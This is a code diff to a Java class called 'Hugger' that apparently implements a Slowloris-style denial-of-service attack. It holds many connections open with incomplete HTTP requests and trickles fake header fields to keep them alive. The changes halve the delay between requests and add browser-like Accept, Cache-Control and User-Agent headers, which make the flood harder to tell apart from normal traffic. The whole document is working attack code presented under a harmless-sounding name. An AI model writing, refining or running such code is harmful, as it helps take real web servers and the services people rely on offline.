@@ -10,12 +10,13 @@ import static com.hugs.UserAgents.AGENTS;
 import static com.hugs.Utils.RND;
 import static com.hugs.Utils.sleep;
 import static java.lang.Math.max;
+import static java.lang.System.lineSeparator;
 
 public class Hugger implements Runnable {
 
     private static final Logger log = LogManager.getLogger(Hugger.class);
 
-    private static final int PAUSE_BETWEEN_REQUESTS = 2000;
+    private static final int PAUSE_BETWEEN_REQUESTS = 1000;
 
     private URL hugReceiver;
     private int port;
@@ -80,16 +81,17 @@ public class Hugger implements Runnable {
     private String[] createInitialPartialRequests() {
         String[] allPartials = new String[connections];
         if (!stop){
-            String pagePrefix = "/";
-            if (hugReceiver.getPath().startsWith("/")) pagePrefix = "";
-
-            String type = "GET " + pagePrefix + hugReceiver.getPath() + " HTTP/1.1" +  System.lineSeparator();
-            String host = "Host: " + hugReceiver.getHost() + (port == 80 ? "" : ":" + port) + System.lineSeparator();
-            String contentType = "Content-Type: */* " +  System.lineSeparator();
-            String connection = "Connection: keep-alive" +  System.lineSeparator();
+            String pagePrefix = hugReceiver.getPath().startsWith("/") ? "" : "/";
+            String type = "GET " + pagePrefix + hugReceiver.getPath() + " HTTP/1.1" +  lineSeparator();
+            String host = "Host: " + hugReceiver.getHost() + (port == 80 ? "" : ":" + port) + lineSeparator();
+            String accept = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" + lineSeparator();
+            String connection = "Connection: keep-alive" +  lineSeparator();
+            String cache = "Cache-Control: no-cache" +  lineSeparator();
 
             for (int i = 0; i < connections; i++) {
-                allPartials[i] = type + host + contentType + connection + AGENTS[RND.nextInt(AGENTS.length)] + System.lineSeparator();
+                String agent = "User-Agent: " + AGENTS[RND.nextInt(AGENTS.length)] + lineSeparator();
+                allPartials[i] = type + host + agent + accept + connection + cache + lineSeparator();
+                log.trace(allPartials[i]);
             }
         }
 
@@ -124,7 +126,7 @@ public class Hugger implements Runnable {
     private void closeAllConnections() throws IOException {
         for (int i = 0; i < connections; i++) {
             try {
-                if (sockets[i] != null) sockets[i].getOutputStream().write(System.lineSeparator().getBytes());
+                if (sockets[i] != null) sockets[i].getOutputStream().write(lineSeparator().getBytes());
             } catch (IOException e) {
                 log.warn("Couldn't gracefully close connections");
                 log.debug("Reason:", e);
@@ -152,7 +154,8 @@ public class Hugger implements Runnable {
      */
     private void sendFalseHeaderField(int index) {
         char[] alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ".toCharArray();
-        String fakeField = alphabet[RND.nextInt(alphabet.length)] + "-" + alphabet[RND.nextInt(alphabet.length)] + ": " + RND.nextInt() + System.lineSeparator();
+        String fakeField = alphabet[RND.nextInt(alphabet.length)] + "-" + alphabet[RND.nextInt(alphabet.length)] + ": " + RND.nextInt() + lineSeparator();
+        log.trace("Fake field: {}", fakeField);
         try {
             if (sockets[index] != null) sockets[index].getOutputStream().write(fakeField.getBytes());
         } catch (IOException e) {
